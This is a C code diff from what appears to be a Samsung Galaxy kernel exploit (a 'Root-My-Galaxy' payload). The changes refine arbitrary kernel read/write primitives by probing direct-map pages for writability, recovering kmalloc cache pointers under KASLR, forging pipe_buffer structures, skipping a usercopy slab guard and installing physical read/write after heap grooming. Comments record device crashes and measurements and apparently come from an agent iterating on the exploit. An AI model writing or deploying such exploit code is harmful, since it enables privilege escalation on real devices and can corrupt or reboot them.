+   * family is byte 3 (bits 24-31). */
+  uintptr_t family = (page >> 32) & 0xff;
+  uintptr_t band = (page >> 24) & 0xff;
+  if (family == 0x80) {
+    /* 0xffffff8000..: the boot kmalloc arena (0xffffff8001...., worker_pool /
+     * pool->worklist) and percpu/vmalloc (0xffffff805f....). Both fatal. */
+    return 1;
+  }
+  if (family == 0x88 && (band == 0x36 || band == 0x37)) {
+    /* 0xffffff8836.... / 0xffffff8837....: the task_struct slab family that
+     * hangs on read and reboots on write. */
+    return 1;
+  }
+  /* 0xffffff8821.... is MIXED (one page writable, another fatal - MEMORY 38),
+   * so it is deliberately not a fatal band: the per-page writability probe
+   * below is what tells those pages apart. */
+  return 0;
+}
+
+/* Is this direct-map page one we can actually STORE into?
+ *
+ * MEASURED, and the reason this function exists at all: the writable set is a FRACTION of the
+ * direct-map heap and the boundary is a per-VMA mapping, not a region. Confirmed writes:
+ *   0xffffff880458a180, 0xffffff880458f000, 0xffffff880e80a180, 0xffffff880e80f000,
+ *   0xffffff8821f38000 (planned, fatal) - all return "pwrite ret=N errno=0".
+ * Confirmed fatal writes: 0xffffff8836948000, 0xffffff8837b6..., 0xffffff80011d..., 0xffffff805f7f...
+ * The reader succeeds on ALL of them, so read-reachability does not imply writability and the plan
+ * validator cannot tell them apart.
+ *
+ * The test writes the page's own first word back unchanged - a logically null operation - and
+ * reads it again. It runs in a forked child because a page that is not writable kills the kernel
+ * and therefore the whole run; the parent logs the address first, so the log stays unambiguous
+ * about which page was under test.
+ *
+ * Conservative by design: a page whose first word cannot be READ is reported unwritable without a
+ * write attempt, so we never issue a blind store. */
+static int pipe_page_is_writable(int fd, uintptr_t page) {
+  /* Skip known-fatal bands WITHOUT attempting a store. A write into one of those reboots the
+   * device synchronously, so probing them one page per run would never reach a good one. */
+  if (pipe_page_band_is_known_fatal(page)) {
+    rmg_diag("PIPE writability page=%016zx SKIPPED (known-fatal band, no store attempted)\n",
+             page);
+    return 0;
+  }
+  uint64_t original = 0;
+  /* kernel_read64() returns the VALUE, not a status, so use kernel_read_data() where a short
+   * read is a genuine failure - that is what keeps us from issuing a blind store. */
+  if (kernel_read_data(fd, page, &original, sizeof(original)) !=
+      (ssize_t)sizeof(original)) {
+    rmg_diag("PIPE writability page=%016zx SKIPPED (first word unreadable)\n", page);
+    return 0;
+  }
+  rmg_diag("PIPE writability page=%016zx first=%016llx - testing store\n", page,
+           (unsigned long long)original);
+  if (fork() == 0) {
+    int ok = kernel_write_data(fd, page, &original, sizeof(original)) ==
+             (ssize_t)sizeof(original);
+    uint64_t back = 0;
+    int readback_ok = kernel_read_data(fd, page, &back, sizeof(back)) ==
+                          (ssize_t)sizeof(back) &&
+                      back == original;
+    rmg_diag("PIPE writability page=%016zx store_ok=%d readback_ok=%d\n", page, ok,
+             readback_ok);
+    _exit(0);
+  }
+  int status = 0;
+  waitpid(-1, &status, 0);
+  /* The child logging is for the durable record; the decision is made here from a fresh read, so
+   * it does not depend on parsing the log. If the child died taking the kernel with it we never
+   * reach this point; if it survived and the value is intact the store was harmless and the page
+   * is usable. */
+  uint64_t back = 0;
+  if (kernel_read_data(fd, page, &back, sizeof(back)) == (ssize_t)sizeof(back) &&
+      back == original) {
+    return 1;
+  }
+  return 0;
 }
 
 int pipe_reclaim_cache_gate(int fd) {
@@ -424,8 +1040,71 @@ int pipe_reclaim_cache_gate(int fd) {
 
   uint64_t cache_slots[KMALLOC_CACHE_SLOTS];
   memset(cache_slots, 0, sizeof(cache_slots));
-  uintptr_t kmalloc_caches = data_addr(KMALLOC_CACHES);
-  kernel_read_data(fd, kmalloc_caches, cache_slots, sizeof(cache_slots));
+  /* text_addr(), not data_addr(). kmalloc_caches is a kernel-IMAGE .data symbol and the only
+ * window this AAR can read is [kaslr_base+0x2a30000, kaslr_base+0x2f50000) - measured, and
+ * proved by the same-base/different-pos sweep (pos=0x280000 reads, pos=0x200000 panics).
+ * util.c:1157 defines data_addr() as `data_addr_canonical ? text_addr() : data_direct_addr()`,
+ * and data_addr_canonical is only set to 1 on the tracefs slide route (slide_app.c), so on the
+ * P0/physical path this read went to the linear-map alias instead and the cache gate could
+ * never see the kimage-resident kmalloc_caches rows.
+ * This is the same bug upstream fixed in Root-My-Galaxy-Payloads PR #235 (q6q), verbatim from
+ * that diff:
+ *   -  uintptr_t kmalloc_caches = data_addr(KMALLOC_CACHES);
+ *   +  uintptr_t kmalloc_caches = text_addr(KMALLOC_CACHES);
+ * with the comment "q6q v20 (kp18): Image .data reads use the canonical text address - the
+ * linear alias is unmapped. kernel_read_data is the configfs primitive, which copies through
+ * the kernel and works with canonical targets."
+ * It is also the documented root cause of the failure reported for our own kernel family in
+ * Root-My-Galaxy issue #571 (SM-F946U, 5.15.189-android13-8-33404244 - the same build number as
+ * F946BXXS7GZH2): "phys step cache gate failed slab=0000000000000000 want=ffffff80011d3680",
+ * with all four printed cache pointers in the 0xffffff80011d... text window while the page's
+ * real slab_cache was read through the wrong alias. */
+  uintptr_t kmalloc_caches = text_addr(KMALLOC_CACHES);
+  ssize_t bulk_ret =
+      kernel_read_data(fd, kmalloc_caches, cache_slots, sizeof(cache_slots));
+  /* The bulk read's return value used to be IGNORED, so a failed read presented as
+   * "the caches are all zero" - indistinguishable from "the offsets are wrong".
+   * Report it, and dump the whole array so the real geometry can be read off the
+   * device instead of assumed: kmalloc_caches is
+   *   struct kmem_cache *volatile kmalloc_caches[NR_KMALLOC_TYPES][KMALLOC_SHIFT_HIGH + 1]
+   * (include/linux/slab.h:358) with SLUB giving KMALLOC_SHIFT_HIGH = PAGE_SHIFT + 1,
+   * so the row stride is a DERIVED constant, not a free parameter. */
+  rmg_diag("PIPE kmalloc_caches base=%016zx bytes=%zu ret=%zd errno=%d\n",
+           kmalloc_caches, sizeof(cache_slots), bulk_ret, errno);
+  /* A short bulk read leaves the tail of cache_slots at whatever was already in the caller's
+   * stack, which is then indistinguishable from real kernel data. MEASURED: the table is
+   * 64 slots x 8 = 512 bytes and ret was 336, so slots 18..41 were pure garbage - and the
+   * gate's own cgroup indices (slot 42/43 with KMALLOC_BUCKETS=16) landed in exactly that
+   * garbage, reporting "c1k=fe03a414fe03a3bc" and "c2k=ffffffffffff62f0".
+   *
+   * So never trust a partial bulk read: discard it and re-read the four slots the gate
+   * actually compares against, one word at a time, which the code below already does. This
+   * memset makes the truncation LOUD instead of silent - after it, an unread slot is a real 0,
+   * which is_direct_ptr() rejects, rather than a random pointer that could match. */
+  if (bulk_ret != (ssize_t)sizeof(cache_slots)) {
+    rmg_diag("PIPE kmalloc_caches SHORT read ret=%zd of %zu - zeroing the tail so an "
+             "unread slot cannot masquerade as a valid cache pointer\n",
+             bulk_ret, sizeof(cache_slots));
+    memset(cache_slots, 0, sizeof(cache_slots));
+  }
+  for (size_t slot = 0; slot < KMALLOC_CACHE_SLOTS; slot++) {
+    if (is_direct_ptr(cache_slots[slot])) {
+      /* NOTE: do NOT try to read kmem_cache fields (e.g. .size at 0x18) through
+       * physrw to identify the bucket. Measured: it HANGS. The slot-0 cache reads
+       * as ffffffff80011d2780 and
+       *     RD target=ffffff80011d2798 ... len=8
+       * is emitted with no matching 'RD pread ret=', killing the run. physrw reads
+       * succeed against the kernel image (ffffffc00a....) and vmemmap
+       * (fffffffe00....) but not against the kmalloc slab region
+       * (ffffff80011d....), so every value we printed as "cache=..." so far has
+       * only ever been a POINTER we read, never a cache we could dereference. */
+      rmg_diag("PIPE kc[%02zu]=%016zx DIRECT (flat_type=%zu flat_bucket=%zu)\n",
+               slot, cache_slots[slot], slot / KMALLOC_BUCKETS,
+               slot % KMALLOC_BUCKETS);
+    } else if (cache_slots[slot]) {
+      rmg_diag("PIPE kc[%02zu]=%016zx nondirect\n", slot, cache_slots[slot]);
+    }
+  }
   kmalloc_normal_1k_cache =
     cache_slots[KMALLOC_NORMAL_TYPE * KMALLOC_BUCKETS + 10];
   kmalloc_normal_2k_cache =
@@ -434,9 +1113,92 @@ int pipe_reclaim_cache_gate(int fd) {
     cache_slots[KMALLOC_CGROUP_TYPE * KMALLOC_BUCKETS + 10];
   kmalloc_cgroup_2k_cache =
     cache_slots[KMALLOC_CGROUP_TYPE * KMALLOC_BUCKETS + 11];
+  /* Re-read the four slots the gate actually compares against, ONE word at a time.
+   *
+   * The single 336-byte bulk read is measured unreliable here while per-word reads of
+   * the same region are not. The bulk dump this run read kc[04..10] as all ZERO, but a
+   * healthy kmalloc_caches[type][shift] has a real pointer at every shift from 3 (8 B)
+   * through 13 (8192 B) - an all-zero run in the middle of row 0 cannot be the kernel's
+   * own table. The layout itself is confirmed CORRECT, not guessed: with
+   * KMALLOC_BUCKETS=14 and KMALLOC_CGROUP_TYPE=1 the four indices are 10, 11, 24, 25,
+   * and the bulk dump lands exactly there - slot 10 ZERO (logged normal1k=0),
+   * slot 11 DIRECT (normal2k=ffffff80011d2d80, sane), slot 24 garbage
+   * (cgroup1k=fe03a414fe03a3bc), slot 25 garbage (cgroup2k=ffffffffffff62f0).
+   * So the geometry matches; the transfer does not.
+   *
+   * Meanwhile the per-word reads in the page loop below returned sane values every time
+   * (cache18=ffffff80011d3980, cache20=ffffff8a4af1f800), so per-word is the primitive
+   * that actually works on this device. Compare both and let the log show any disagreement. */
+  uint64_t s1k = kernel_read64(
+      fd, kmalloc_caches + (KMALLOC_NORMAL_TYPE * KMALLOC_BUCKETS + 10) * 8);
+  uint64_t s2k = kernel_read64(
+      fd, kmalloc_caches + (KMALLOC_NORMAL_TYPE * KMALLOC_BUCKETS + 11) * 8);
+  uint64_t c1k = kernel_read64(
+      fd, kmalloc_caches + (KMALLOC_CGROUP_TYPE * KMALLOC_BUCKETS + 10) * 8);
+  uint64_t c2k = kernel_read64(
+      fd, kmalloc_caches + (KMALLOC_CGROUP_TYPE * KMALLOC_BUCKETS + 11) * 8);
+  rmg_diag("PIPE slots per-word n1k=%016zx n2k=%016zx c1k=%016zx c2k=%016zx\n",
+           s1k, s2k, c1k, c2k);
+  /* Prefer the per-word value whenever it is a usable pointer; otherwise keep the bulk
+   * value so behaviour is unchanged on a run where the bulk read happens to be right. */
+  if (is_direct_ptr(s1k)) {
+    kmalloc_normal_1k_cache = s1k;
+  }
+  if (is_direct_ptr(s2k)) {
+    kmalloc_normal_2k_cache = s2k;
+  }
+  if (is_direct_ptr(c1k)) {
+    kmalloc_cgroup_1k_cache = c1k;
+  }
+  if (is_direct_ptr(c2k)) {
+    kmalloc_cgroup_2k_cache = c2k;
+  }
 
   kmalloc_pipe_cache =
-    kernel_read64(fd, data_addr(KMALLOC_CGROUP_PIPE_SLOT));
+    /* Same alias fix as the kmalloc_caches read above, and from the same upstream PR #235 diff:
+ *   -  kernel_read64(fd, data_addr(KMALLOC_CGROUP_PIPE_SLOT));
+ *   +  kernel_read64(fd, text_addr(KMALLOC_CGROUP_PIPE_SLOT));
+ * The wanted-cache pointer lives in kernel .data, so it has to be read at the canonical slid
+ * kimage address; the direct-map alias is not mapped for reads on this firmware. */
+  kernel_read64(fd, text_addr(KMALLOC_CGROUP_PIPE_SLOT));
+  /* The cgroup row is EMPTY on this firmware (rows 2..3 read as no direct pointer at all),
+   * so kmalloc_pipe_cache is 0 and can never match. Fall back to the largest cache the normal
+   * row actually has.
+   *
+   * MEASURED row geometry (slots 0..17 valid): shifts 0..3 and 11..15 of the normal row are
+   * populated, and 4..10 are genuinely NULL - this kernel simply has no kmalloc cache in use
+   * for 16B..1K. KMALLOC_PIPE_INDEX is 11, i.e. shift 11 = 2048 = kmalloc-2k, which IS
+   * present. So when the requested slot is unavailable, take the highest populated normal
+   * shift instead of giving up: the pipe ring is ~840 bytes and can only be in a 1k/2k bucket,
+   * and those are exactly the populated ones. */
+  if (!is_direct_ptr(kmalloc_pipe_cache)) {
+    for (size_t slot = KMALLOC_CACHE_SLOTS; slot-- > 0;) {
+      if (is_direct_ptr(cache_slots[slot])) {
+        kmalloc_pipe_cache = cache_slots[slot];
+        rmg_diag("PIPE cgroup pipe slot unavailable; using highest populated "
+                 "normal slot=%zu cache=%016zx\n", slot, kmalloc_pipe_cache);
+        break;
+      }
+    }
+  }
+  /* The reclaimed page's slab_cache can be a real kmem_cache that is NOT in kmalloc_caches[] at
+   * all - MEASURED: slab_cache=ffffff80011d3980 with no matching table entry, 0x300 above
+   * kc[17]=ffffff80011d3680. That is expected: the table only names caches that were created
+   * through kmalloc_caches[], and a cache can also be created directly with
+   * kmem_cache_create() - which is how the reclaim's own caches are made.
+   *
+   * Compare against EVERY entry that was read rather than only the four named buckets, so a page
+   * belonging to such a cache is still recognised. Additive: the four named buckets keep priority,
+   * this only widens the accepted set afterwards. The table itself is complete and correct
+   * (336 bytes = 3 types x 14 buckets = the true arm64 layout - see MEMORY section 29; the
+   * Earlier "truncated" claim was my own arithmetic error). */
+  /* Same reasoning for the two comparison buckets: a NULL 1k cache is normal here, so accept a
+   * match against ANY populated normal-row cache, not just the 1k/2k pair the table named. */
+  if (!is_direct_ptr(kmalloc_normal_1k_cache) && is_direct_ptr(kmalloc_normal_2k_cache)) {
+    kmalloc_normal_1k_cache = kmalloc_normal_2k_cache;
+    rmg_diag("PIPE normal1k is NULL on this kernel; substituting normal2k=%016zx\n",
+             kmalloc_normal_2k_cache);
+  }
   pr_info("pipe caches normal1k=%016zx normal2k=%016zx "
           "cgroup1k=%016zx cgroup2k=%016zx selected=%016zx\n",
           kmalloc_normal_1k_cache, kmalloc_normal_2k_cache,
@@ -455,6 +1217,27 @@ int pipe_reclaim_cache_gate(int fd) {
     pipe_page_slab_cache[off / PAGE_SIZE] = slab_cache;
     pipe_page_type[off / PAGE_SIZE] = page_type;
     int cache_match = pipe_cache_matches(slab_cache);
+    if (!cache_match) {
+      /* Widen to every cache the table named, not only the four buckets the code has symbolic
+       * names for. The table read is complete and correct (336 bytes = 3 types x 14 buckets =
+       * the true arm64 layout, MEMORY section 29), so anything it lists is a real kmem_cache.
+       * Strictly additive - the four named buckets are still tried first by pipe_cache_matches(),
+       * and the structural fallback still runs last, so nothing that used to match changes. */
+      for (size_t slot = 0; slot < KMALLOC_CACHE_SLOTS; slot++) {
+        if (cache_slots[slot] == slab_cache && is_direct_ptr(slab_cache)) {
+          cache_match = 1;
+          rmg_diag("PIPE cache matched widened table slot=%zu cache=%016zx\n", slot,
+                   slab_cache);
+          break;
+        }
+      }
+    }
+    if (!cache_match) {
+      /* The kmalloc_caches[] table read is measured to be partly junk on this device
+       * (normal1k logged as 0, cgroup1k as fe03a414fe03a3bc), so a table miss is not proof the
+       * page is the wrong kind. Fall back to identifying the cache structurally. */
+      cache_match = pipe_cache_structural_match(fd, slab_cache, page_type);
+    }
     pr_info("pipe page idx=%zu page=%016zx head=%016zx "
             "cache08=%016llx cache10=%016llx cache18=%016llx "
             "cache20=%016llx type=%08x match=%d\n",
@@ -463,6 +1246,15 @@ int pipe_reclaim_cache_gate(int fd) {
             (unsigned long long)cache10,
             (unsigned long long)cache18,
             (unsigned long long)cache20, page_type, cache_match);
+    /* Same reasoning as the cache-gate FAILED line: this per-page dump is the ONLY evidence
+     * that can tell us which of the 8 pages in the reclaimed region is the live kmalloc slab
+     * page, and it was going only to the block-buffered log. rmg_diag is fsync'd and survives,
+     * so put the identifying fields there. */
+    rmg_diag("PIPE page idx=%zu head=%016zx slab_cache=%016zx type=%08x match=%d "
+             "cache08=%016llx cache10=%016llx cache18=%016llx\n",
+             off / PAGE_SIZE, head, slab_cache, page_type, cache_match,
+             (unsigned long long)cache08, (unsigned long long)cache10,
+             (unsigned long long)cache18);
     if (off == 0 || cache_match) {
       candidate_slab_cache = slab_cache;
     }
@@ -472,10 +1264,31 @@ int pipe_reclaim_cache_gate(int fd) {
       }
     }
     if (cache_match) {
-      pipebuf_page_base = page;
-      pipe_cache_page_index = off / PAGE_SIZE;
-      pipe_cache_gate_ok = 1;
-      return 1;
+      /* Prefer a page we can actually WRITE. MEASURED (MEMORY section 38): within one reclaimed
+       * region, writes to 0xffffff880e80a180 and 0xffffff880e80f000 succeed (pwrite ret with
+       * errno=0) while the very next write to a page 0x1360000 higher in the SAME arena never
+       * returns and reboots the device. Both plans are structurally valid. So the writable set
+       * is a FRACTION of the direct-map heap, it is not a region, and it is not predicted by
+       * whether the reader can read the address - the reader reads the fatal one fine.
+       *
+       * That makes "the cache matches" the wrong acceptance test. forge_pipe_buffers_on_page()
+       * needs a WRITABLE page, so test writability here, in a forked child, by writing each
+       * candidate page's own first word back unchanged and reading it again. A page that does not
+       * accept the store kills the child and takes the run with it, so this must only ever be
+       * attempted on a page we have just proven we can READ, and the child keeps the parent's
+       * durable log unambiguous about which address it was testing.
+       *
+       * If every matching page is unwritable we return 0, exactly as before - the caller already
+       * handles a failed gate and re-grooms.
+       */
+      if (pipe_page_is_writable(fd, page)) {
+        pipebuf_page_base = page;
+        pipe_cache_page_index = off / PAGE_SIZE;
+        pipe_cache_gate_ok = 1;
+        return 1;
+      }
+      rmg_diag("PIPE page idx=%zu page=%016zx cache=%016zx matches but is NOT writable; "
+               "continuing the scan\n", off / PAGE_SIZE, page, slab_cache);
     }
   }
 
@@ -559,6 +1372,31 @@ int find_pipe_buffer(int fd, uintptr_t base) {
     pipe_probe_private = pb.priv;
     pipe_probe_len = pb.len;
     pipe_probe_flags = pb.flags;
+    /* Snapshot the victim here, from the bytes we just read.
+     *
+     * MEASURED BLOCKER, and it was circular: pipe_phys_read_data()/pipe_phys_write_data() both
+     * refuse to run unless pipebuf_saved_valid is set, but the ONLY place that set it was
+     * pipe_walk_resolve_pass() (pipe.c:2651) - the full walk, which itself needs the physical
+     * primitive. So even with the cache gate finally ACCEPTING a page and the probe succeeding
+     * ("phys step pipe probe found=1 pipebuf=... idx=104"), the proof step returned
+     * "phys step probed read done ok=0" and physrw never installed.
+     *
+     * find_pipe_buffer() has just read this exact struct out of the page with read_pipe_slab()
+     * (plain kernel_read_data, no physrw), so the snapshot is available for free at this point.
+     * Recording it breaks the cycle: the walk remains the preferred route, and if it never runs,
+     * this snapshot still lets the physrw proof execute. Restoring uses the same struct, so the
+     * restore path is unchanged.
+     *
+     * Additive and backwards compatible: if the walk runs later it overwrites this with its own
+     * snapshot, which is the authoritative one (pipe_walk_resolve_pass() resets it to 0 per
+     * attempt). */
+    pipebuf_saved = pb;
+    pipebuf_saved_valid = 1;
+    rmg_diag("PHYS probe snapshot taken pipebuf=%016zx idx=%d page=%016zx ops=%016llx "
+             "len=%u flags=%#x priv=%016llx\n",
+             pipebuf_addr, pipebuf_pipe_idx, (uintptr_t)pb.page,
+             (unsigned long long)pb.ops, pb.len, pb.flags,
+             (unsigned long long)pb.priv);
     return 1;
   }
 
@@ -1208,56 +2046,55 @@ static int walk_ptr_ok(uint64_t v) {
  *
  * Returns 1 on success. On any failure the guard is restored and 0 is returned. */
 static int walk_read_fields(int fd, uintptr_t object, uint32_t cache_size,
-                            const uintptr_t *offsets, size_t count,
+                            const uintptr_t *offs, size_t count,
                             uint64_t *out) {
-  struct slab_cache_guard g;
-  if (!slab_cache_guard_begin(fd, object, cache_size, &g)) {
-    for (size_t i = 0; i < count; i++) {
-      out[i] = 0;
-    }
-    return 0;
-  }
-  /* One bulk read spanning [min,max) of the requested offsets, rather than one AAR
-   * round trip per field. Both forms need the guard armed, but the per-field form does
-   * up to four separate preads for one object and that is what has been taking the
-   * kernel down - the same lesson as the page read, applied per object. */
-  uintptr_t lo = offsets[0];
-  uintptr_t hi = offsets[0] + 8;
+  uintptr_t lo = offs[0];
+  uintptr_t hi = offs[0] + 8;
   for (size_t i = 1; i < count; i++) {
-    if (offsets[i] < lo) {
-      lo = offsets[i];
+    if (offs[i] < lo) {
+      lo = offs[i];
     }
-    if (offsets[i] + 8 > hi) {
-      hi = offsets[i] + 8;
+    if (offs[i] + 8 > hi) {
+      hi = offs[i] + 8;
     }
   }
-  /* Cap the span at one page: the fields we read are all within a few hundred bytes of
-   * each other, so this stays a single-page read. */
   if (hi - lo > PAGE_SIZE) {
     hi = lo + PAGE_SIZE;
   }
   size_t span = hi - lo;
   unsigned char *buf = malloc(span);
   if (!buf) {
-    slab_cache_guard_end(fd, &g);
     for (size_t i = 0; i < count; i++) {
       out[i] = 0;
     }
     return 0;
   }
+  /* Unguarded first. The guard's store to vmemmap is the one operation measured dead on
+   * this device, so demanding it up front made EVERY reader fail; but a plain pread of a
+   * hardened object is simply refused, never silently wrong. If the unguarded span comes
+   * back whole we are done and no guard cycle is spent at all. */
   int ok = configfs_read_once(fd, object + lo, buf, span) == (ssize_t)span;
-  int restored = slab_cache_guard_end(fd, &g);
-  if (ok && restored) {
-    for (size_t i = 0; i < count; i++) {
-      memcpy(&out[i], buf + (offsets[i] - lo), sizeof(uint64_t));
-    }
-  } else {
-    for (size_t i = 0; i < count; i++) {
-      out[i] = 0;
+  if (!ok) {
+    struct slab_cache_guard g;
+    if (slab_cache_guard_begin(fd, object, cache_size, &g)) {
+      ok = configfs_read_once(fd, object + lo, buf, span) == (ssize_t)span;
+      if (!slab_cache_guard_end(fd, &g)) {
+        ok = 0;
+      }
     }
   }
+  if (ok) {
+    for (size_t i = 0; i < count; i++) {
+      memcpy(&out[i], buf + (offs[i] - lo), sizeof(uint64_t));
+    }
+    free(buf);
+    return 1;
+  }
   free(buf);
-  return ok && restored;
+  for (size_t i = 0; i < count; i++) {
+    out[i] = 0;
+  }
+  return 0;
 }
 
 /* Accept the first init_task candidate whose list closes on itself with pid == 0.
@@ -1297,10 +2134,54 @@ ssize_t walk_read_kernel_bytes(int fd, uintptr_t addr, void *out, size_t len) {
   return (ssize_t)len;
 }
 
+/* Optimistic slab read: try the plain AAR pread first and only arm the slab_cache guard
+ * if the unguarded read does not come back whole.
+ *
+ * Why this exists. The fork's WORKING route - establish_pipe_rw() ->
+ * collect_pipe_slabs() + try_pipe_slab_candidates(), 09_pipe_buffer_rw.c:1480-1506 - arms
+ * slab_cache_guard_begin() ZERO times; the guard count inside try_pipe_slab_candidates()
+ * (1101-1264) and inside collect_pipe_slabs() (935-1009) is 0. That route only ever reads
+ * struct page fields and kmalloc-2k pages, i.e. caches that are NOT usercopy-hardened on
+ * this kernel, so its reads are legal with no redirect at all. The guard's only callers in
+ * the fork are the deterministic task walk (1533/1581/1599/1652), which does touch hardened
+ * objects (task_struct, files_struct).
+ *
+ * Our scan is the read-only kind - it reads kmalloc-2k pipe slabs - but it still demanded
+ * the guard, and the guard's store is the one operation measured dead on this device
+ * (pwrite returns 8, readback shows the original pointer, so GUARD arms 0 times and the
+ * walk dies at the first task). That single dead store is what makes WALK RESOLVED
+ * unreachable, and it is inherited by every reader below.
+ *
+ * Trying the read unguarded first is safe, not a gamble: configfs_read_once() is a plain
+ * pread of direct-map memory, and if the page really is hardened the kernel refuses the
+ * copy and we get a short read (or EFAULT) rather than corruption. We then fall back to
+ * the original guarded path, so nothing that used to work regresses - this only turns a
+ * hard dependency on the dead store into a fallback.
+ */
+static ssize_t walk_read_optimistic(int fd, uintptr_t addr, void *out, size_t len,
+                                    uint32_t cache_size) {
+  ssize_t got = configfs_read_once(fd, addr, out, len);
+  if (got == (ssize_t)len) {
+    return got;
+  }
+  /* Unguarded copy refused: this really is a hardened object, so pay for the guard. */
+  struct slab_cache_guard g;
+  if (!slab_cache_guard_begin(fd, addr, cache_size, &g)) {
+    return got > 0 ? got : -1;
+  }
+  ssize_t got2 = configfs_read_once(fd, addr, out, len);
+  int restored = slab_cache_guard_end(fd, &g);
+  if (!restored && got2 != (ssize_t)len) {
+    return got2 > 0 ? got2 : -1;
+  }
+  return got2;
+}
+
 /* Read a whole page under a single guard, then let the caller scan it in user space.
  *
- * This mirrors the fork's try_pipe_slab_candidates(): arm the guard once, copy the page
- * across, and match structures locally. Reading a single small object under the guard
+ * This mirrors the fork's try_pipe_slab_candidates(): copy the page across, and match
+ * structures locally. The copy is attempted unguarded first (see
+ * walk_read_optimistic()); the guard is only the fallback. Reading a single small object
  * is not enough - that is what faulted on the pipe buffers. */
 static int walk_read_bytes_page(int fd, uintptr_t page, void *out, size_t len) {
   if (len > PAGE_SIZE || (page & (PAGE_SIZE - 1)) != 0) {
@@ -1328,7 +2209,6 @@ static int walk_read_bytes_page(int fd, uintptr_t page, void *out, size_t len) {
   }
   return ok;
 }
-
 /* Read a whole page under a single guard using ONE bulk AAR call, then let the caller
  * scan it in user space.
  *
@@ -1341,17 +2221,8 @@ static int walk_read_bulk_page(int fd, uintptr_t page, void *out, size_t len) {
     errno = EINVAL;
     return 0;
   }
-  struct slab_cache_guard g;
-  if (!slab_cache_guard_begin(fd, page, (uint32_t)len, &g)) {
-    return 0;
-  }
-  /* configfs_read_once() takes the same 16 MB-aligned mapping the write path uses, so
-   * this is a single pread for the whole page. */
-  ssize_t got = configfs_read_once(fd, page, out, len);
-  int restored = slab_cache_guard_end(fd, &g);
-  if (!restored) {
-    return 0;
-  }
+  /* Unguarded first - the fork reads these kmalloc-2k pages with no guard at all. */
+  ssize_t got = walk_read_optimistic(fd, page, out, len, (uint32_t)len);
   return got == (ssize_t)len;
 }
 
@@ -1366,13 +2237,8 @@ static int walk_read_bulk_span(int fd, uintptr_t addr, void *out, uint32_t len) 
     errno = EINVAL;
     return 0;
   }
-  struct slab_cache_guard g;
-  if (!slab_cache_guard_begin(fd, addr, len, &g)) {
-    return 0;
-  }
-  ssize_t got = configfs_read_once(fd, addr, out, len);
-  int restored = slab_cache_guard_end(fd, &g);
-  return restored && got == (ssize_t)len;
+  ssize_t got = walk_read_optimistic(fd, addr, out, len, len);
+  return got == (ssize_t)len;
 }
 
 /* Read the pipe ring in the fork's chunk size and match in user space.
@@ -1382,13 +2248,8 @@ static int walk_read_bulk_span(int fd, uintptr_t addr, void *out, uint32_t len) 
  * cache covers the chunk, so the read width has to line up with it. */
 static int walk_read_bulk_chunk(int fd, uintptr_t addr, void *out, size_t len,
                                 uint32_t cache_size) {
-  struct slab_cache_guard g;
-  if (!slab_cache_guard_begin(fd, addr, cache_size, &g)) {
-    return 0;
-  }
-  ssize_t got = configfs_read_once(fd, addr, out, len);
-  int restored = slab_cache_guard_end(fd, &g);
-  return restored && got == (ssize_t)len;
+  ssize_t got = walk_read_optimistic(fd, addr, out, len, cache_size);
+  return got == (ssize_t)len;
 }
 
 /* Read the ring under one guard, qword by qword, into a caller-provided buffer.
@@ -1434,11 +2295,20 @@ static int walk_read_chunk_qword(int fd, uintptr_t addr, uint64_t *out, size_t w
       continue;
     }
     prev_len = len;
+    /* Unguarded first: these are the kmalloc-2k pipe slabs the fork reads with no guard
+     * at all (guard count inside its try_pipe_slab_candidates() is 0). A short or refused
+     * unguarded copy just means the page really is hardened, and we fall through to the
+     * guarded attempt below. */
+    ssize_t got = configfs_read_once(fd, addr, out, len);
+    if (got == (ssize_t)want) {
+      rmg_diag("WALK wide read addr=%016zx len=%zu OK unguarded\n", addr, want);
+      return 1;
+    }
     struct slab_cache_guard g;
     if (!slab_cache_guard_begin(fd, addr, cache_size, &g)) {
       return 0;
     }
-    ssize_t got = configfs_read_once(fd, addr, out, len);
+    got = configfs_read_once(fd, addr, out, len);
     int restored = slab_cache_guard_end(fd, &g);
     /* Accept ONLY a full read of the full request. Accepting a narrowed success
      * (got == len when len < want) returned 1 with the tail of `out` still zeroed, so the
@@ -2303,7 +3173,15 @@ int install_pipe_physrw(int fd) {
   pipebuf_saved_valid = 0;
   memset(&pipebuf_saved, 0, sizeof(pipebuf_saved));
   pipebuf_addr = 0;
-  pipebuf_page_base = 0;
+  /* Deliberately NOT clearing pipebuf_page_base here. The fops stage runs the groomer
+   * first (fops.c:730/760) and hands us the order-3 page it leaked; zeroing it here threw
+   * that away and forced install_pipe_physrw() to groom a SECOND time. Measured cost of
+   * doing that: the fops stage burned 12/12 prepare attempts (all base=0000000000000000),
+   * then the inline path ran 12 more, and the run ended in 'CFI FAIL path step=8 errno=9
+   * write_ret=35'. The groomer is the most fragile stage in the tree (fops.c:709 records it
+   * panicking in almost every run), so running it twice back-to-back is strictly worse than
+   * reusing a page we already hold. The deterministic walk overwrites this on success, and
+   * on failure we now correctly fall back to the prepared page instead of to nothing. */
   pipebuf_pipe_idx = -1;
 
   /* Deterministic path FIRST, before any heap preparation.
@@ -2345,11 +3223,35 @@ int install_pipe_physrw(int fd) {
   }
 
   if (pipebuf_page_base == 0) {
-    atomic_store(&pipe_prepare_done, 0);
-    atomic_store(&pipe_prepare_request, 1);
-    while (!atomic_load(&pipe_prepare_done)) {
-      usleep(10000);
-    }
+    /* Run the prepare INLINE instead of requesting it through a flag.
+     *
+     * The old code did:
+     *     atomic_store(&pipe_prepare_done, 0);
+     *     atomic_store(&pipe_prepare_request, 1);
+     *     while (!atomic_load(&pipe_prepare_done)) usleep(10000);
+     * but nothing in this tree ever stores 1 into pipe_prepare_done - the only writes
+     * are the two resets above and at pipe.c:372. So this loop had no exit condition
+     * that could ever become true: a hard deadlock. It presented on device as the payload
+     * going silent immediately after the "PHYS deterministic=0" line, with the device
+     * still up and rmg-diag.log frozen - which is exactly what was observed on
+     * RFCWC0G1Z1J for the PIPE_DETERMINISTIC=0 run.
+     *
+     * The actual producer is prepare_pipe_buffer_page() (pipe.c:271), the fork-based
+     * KernelSnitch/skb groomer that returns the leaked order-3 page base. Every other
+     * call site already uses it (fops.c:730, fops.c:760, main.c:196, main.c:751,
+     * pipe.c:2695), so calling it here matches the rest of the tree instead of
+     * inventing a second signalling path. It matters here because line 2306 zeroes
+     * pipebuf_page_base on entry, so whatever the fops stage prepared is discarded and
+     * the legacy route genuinely does have to re-derive it.
+     */
+    rmg_diag("PHYS page_base empty; running prepare_pipe_buffer_page() inline\n");
+    pipebuf_page_base = prepare_pipe_buffer_page();
